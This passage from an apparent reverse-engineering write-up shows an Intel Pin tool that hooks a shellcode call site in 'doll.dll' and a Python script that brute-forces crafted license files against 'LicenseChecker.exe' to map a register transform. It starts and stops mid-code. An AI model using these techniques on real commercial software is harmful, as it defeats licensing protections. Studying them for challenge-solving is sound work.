IARG_THREAD_ID,</span><br><span class="line">                       IARG_FUNCRET_EXITPOINT_VALUE,</span><br><span class="line">                       IARG_END);</span><br><span class="line">        <span class="built_in">RTN_Close</span>(va);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name.<span class="built_in">find</span>(<span class="string">&quot;doll.dll&quot;</span>) != std::string::npos) &#123;</span><br><span class="line">        ADDRINT base = <span class="built_in">IMG_LowAddress</span>(img);</span><br><span class="line">        g_callsite = base + (ADDRINT)KnobCallRva.<span class="built_in">Value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID*)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_callsite != <span class="number">0</span> &amp;&amp; <span class="built_in">INS_Address</span>(ins) == g_callsite) &#123;</span><br><span class="line">        <span class="built_in">INS_InsertCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)EnterShellcode,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_REG_VALUE, REG_RSI,</span><br><span class="line">                       IARG_END);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">INS_InsertIfCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)ShouldTrack,</span><br><span class="line">                     IARG_THREAD_ID,</span><br><span class="line">                     IARG_INST_PTR,</span><br><span class="line">                     IARG_END);</span><br><span class="line">    <span class="built_in">INS_InsertThenCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)OnRCX,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_REG_VALUE, REG_RCX,</span><br><span class="line">                       IARG_END);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Fini</span><span class="params">(INT32, VOID*)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_done &amp;&amp; g_fp) &#123;</span><br><span class="line">        std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;0x0000000000000000\n&quot;</span>);</span><br><span class="line">        std::<span class="built_in">fflush</span>(g_fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">    <span class="keyword">if</span> (g_fp) std::<span class="built_in">fclose</span>(g_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">PIN_InitSymbols</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PIN_Init</span>(argc, argv)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    g_tls = <span class="built_in">PIN_CreateThreadDataKey</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_InitLock</span>(&amp;g_lock);</span><br><span class="line">    g_fp = std::<span class="built_in">fopen</span>(KnobOut.<span class="built_in">Value</span>().<span class="built_in">c_str</span>(), <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_fp) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">IMG_AddInstrumentFunction</span>(ImageLoad, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">INS_AddInstrumentFunction</span>(Instruction, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadStartFunction</span>(ThreadStart, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadFiniFunction</span>(ThreadFini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddFiniFunction</span>(Fini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_StartProgram</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">PIN_CMD = [<span class="string">&quot;pin&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;Dump.dll&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;LicenseChecker.exe&quot;</span>]</span><br><span class="line">WORKDIR = os.getcwd()</span><br><span class="line"></span><br><span class="line">INPUT_PATH = os.path.join(WORKDIR, <span class="string">&quot;license.bin&quot;</span>)</span><br><span class="line">RCX_PATH   = os.path.join(WORKDIR, <span class="string">&quot;rcx_result.txt&quot;</span>)</span><br><span class="line">OUT_PATH   = os.path.join(WORKDIR, <span class="string">&quot;rcx_table.jsonl&quot;</span>)</span><br><span class="line"></span><br><span class="line">BASE_BYTE = <span class="number">0xAA</span></span><br><span class="line">TAIL_BYTE = <span class="number">0xEE</span></span><br><span class="line">HEAD_LEN  = <span class="number">8</span></span><br><span class="line">TAIL_LEN  = <span class="number">24</span></span><br><span class="line">MAX_RETRY = <span class="number">3</span></span><br><span class="line">PIN_TIMEOUT = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">HEX_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;0x([0-9a-fA-F]+)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_input_bytes</span>(<span class="params">head8: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(head8) != HEAD_LEN: <span class="keyword">raise</span> ValueError(<span class="string">&quot;head&quot;</span>)</span><br><span class="line">    lic = head8 + <span class="built_in">bytes</span>([TAIL_BYTE]) * TAIL_LEN</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(lic) != <span class="number">32</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;inp&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> lic: <span class="keyword">raise</span> ValueError(<span class="string">&quot;inp contains 0x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> lic</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_input</span>(<span class="params">head8: <span class="built_in">bytes</span></span>):</span><br><span class="line">    lic = build_input_bytes(head8)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(INPUT_PATH, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f: f.write(lic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_rcx_file</span>(): <span class="keyword">with</span> <span class="built_in">open</span>(RCX_PATH, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f: f.write(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pin_once</span>():</span><br><span class="line">    subprocess.run(</span><br><span class="line">        PIN_CMD,</span><br><span class="line">        cwd=WORKDIR,</span><br><span class="line">        stdout=subprocess.DEVNULL,</span><br><span class="line">        stderr=subprocess.DEVNULL,</span><br><span class="line">        timeout=PIN_TIMEOUT,</span><br><span class="line">        check=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_rcx_result</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    p = Path(RCX_PATH)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.exists(): <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;rcx_result.txt not exist&quot;</span>)</span><br><span class="line">    txt = p.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> txt: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;rcx_result.txt empty&quot;</span>)</span><br><span class="line">    ms = HEX_RE.findall(txt)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ms: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;rcx_result.txt no hex&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ms[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case_get_rcx</span>(<span class="params">head8: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    last_err = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(MAX_RETRY):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            write_input(head8)</span><br><span class="line">            clear_rcx_file()</span><br><span class="line">            run_pin_once()</span><br><span class="line">            rcx = parse_rcx_result()</span><br><span class="line">            <span class="keyword">return</span> rcx</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last_err = e</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;case fail (retry <span class="subst">&#123;MAX_RETRY&#125;</span> times): <span class="subst">&#123;last_err&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">append_record</span>(<span class="params">rec: <span class="built_in">dict</span></span>):</span><br><span class="line">    line = json.dumps(rec, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUT_PATH, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.flush()</span><br><span class="line">        os.fsync(f.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_done_set</span>(<span class="params">out_path: <span class="built_in">str</span></span>):</span><br><span class="line">    done = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_path): <span class="keyword">return</span> done</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> ln, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                obj = json.loads(line)</span><br><span class="line">                pos = <span class="built_in">int</span>(obj[<span class="string">&quot;pos&quot;</span>])</span><br><span class="line">                val = <span class="built_in">int</span>(obj[<span class="string">&quot;val&quot;</span>])</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt;= pos &lt; <span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span> &lt;= val &lt;= <span class="number">255</span>: done.add((pos, val))</span><br><span class="line">            <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> done</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_head</span>(<span class="params">base_byte: <span class="built_in">int</span>, pos: <span class="built_in">int</span>, val: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>([base_byte] * <span class="number">8</span>)</span><br><span class="line">    b[pos] = val</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_hex16</span>(<span class="params">v: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>: <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;v:016X&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    total = <span class="number">8</span> * <span class="number">255</span></span><br><span class="line">    done = load_done_set(OUT_PATH)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Completed: <span class="subst">&#123;<span class="built_in">len</span>(done)&#125;</span>/<span class="subst">&#123;total&#125;</span>&quot;</span>)</span><br><span class="line">    base_head = <span class="built_in">bytes</span>([BASE_BYTE] * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base_rcx = run_case_get_rcx(base_head)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] baseline(AA*8) rcx = <span class="subst">&#123;fmt_hex16(base_rcx)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="built_in">print</span>(<span class="string">f&quot;[!] baseline read failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    finished_now = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">            key = (pos, val)</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> done: <span class="keyword">continue</span></span><br><span class="line">            head = make_head(BASE_BYTE, pos, val)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rcx = run_case_get_rcx(head)</span><br><span class="line">                rec = &#123;</span><br><span class="line">                    <span class="string">&quot;pos&quot;</span>: pos,</span><br><span class="line">                    <span class="string">&quot;val&quot;</span>: val,</span><br><span class="line">                    <span class="string">&quot;val_hex&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;val:02X&#125;</span>&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;state_hex&quot;</span>: head.<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;input32_hex&quot;</span>: (head + <span class="built_in">bytes</span>([TAIL_BYTE])*<span class="number">24</span>).<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;rcx_hex&quot;</span>: fmt_hex16(rcx),</span><br><span class="line">                    <span class="string">&quot;rcx_le_hex&quot;</span>: rcx.to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>).<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;rcx_be_hex&quot;</span>: rcx.to_bytes(<span class="number">8</span>, <span class="string">&quot;big&quot;</span>, signed=<span class="literal">False</span>).<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;ts&quot;</span>: datetime.utcnow().isoformat() + <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                append_record(rec)</span><br><span class="line">                done.add(key)</span><br><span class="line">                finished_now += <span class="number">1</span></span><br><span class="line">                done_cnt = <span class="built_in">len</span>(done)</span><br><span class="line">                elapsed = time.time() - start_time</span><br><span class="line">                speed = finished_now / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">                remain = total - done_cnt</span><br><span class="line">                eta = remain / speed <span class="keyword">if</span> speed &gt; <span class="number">1e-9</span> <span class="keyword">else</span> <span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;[OK] pos=<span class="subst">&#123;pos&#125;</span> val=0x<span class="subst">&#123;val:02X&#125;</span> rcx=<span class="subst">&#123;fmt_hex16(rcx)&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;progress <span class="subst">&#123;done_cnt&#125;</span>/<span class="subst">&#123;total&#125;</span> | speed=<span class="subst">&#123;speed:<span class="number">.2</span>f&#125;</span>/s | eta=<span class="subst">&#123;eta/<span class="number">60</span>:<span class="number">.1</span>f&#125;</span>m&quot;</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                err_rec = &#123;</span><br><span class="line">                    <span class="string">&quot;pos&quot;</span>: pos,</span><br><span class="line">                    <span class="string">&quot;val&quot;</span>: val,</span><br><span class="line">                    <span class="string">&quot;val_hex&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;val:02X&#125;</span>&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;state_hex&quot;</span>: head.<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e),</span><br><span class="line">                    <span class="string">&quot;ts&quot;</span>: datetime.utcnow().isoformat() + <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                append_record(err_rec)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[ERR] pos=<span class="subst">&#123;pos&#125;</span> val=0x<span class="subst">&#123;val:02X&#125;</span> -&gt; <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Generate table:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Dict</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">B</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ (x &gt;&gt; <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">C</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">D</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">state: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    s = state</span><br><span class="line">    out = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    out[<span class="number">0</span>] = A(s[<span class="number">0</span>]) ^ C(s[<span class="number">2</span>]) ^ B(s[<span class="number">3</span>]) ^ D(s[<span class="number">5</span>])</span><br><span class="line">    out[<span class="number">1</span>] = B(s[<span class="number">0</span>]) ^ A(s[<span class="number">1</span>]) ^ C(s[<span class="number">3</span>]) ^ D(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">2</span>] = C(s[<span class="number">0</span>]) ^ B(s[<span class="number">1</span>]) ^ A(s[<span class="number">2</span>]) ^ D(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">3</span>] = C(s[<span class="number">1</span>]) ^ B(s[<span class="number">2</span>]) ^ A(s[<span class="number">3</span>]) ^ D(s[<span class="number">4</span>])</span><br><span class="line">    out[<span class="number">4</span>] = D(s[<span class="number">1</span>]) ^ E(s[<span class="number">4</span>]) ^ C(s[<span class="number">6</span>]) ^ B(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">5</span>] = D(s[<span class="number">2</span>]) ^ B(s[<span class="number">4</span>]) ^ E(s[<span class="number">5</span>]) ^ C(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">6</span>] = D(s[<span class="number">3</span>]) ^ C(s[<span class="number">4</span>]) ^ B(s[<span class="number">5</span>]) ^ E(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">7</span>] = D(s[<span class="number">0</span>]) ^ C(s[<span class="number">5</span>]) ^ B(s[<span class="number">6</span>]) ^ E(s[<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_le64</span>(<span class="params">v: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span 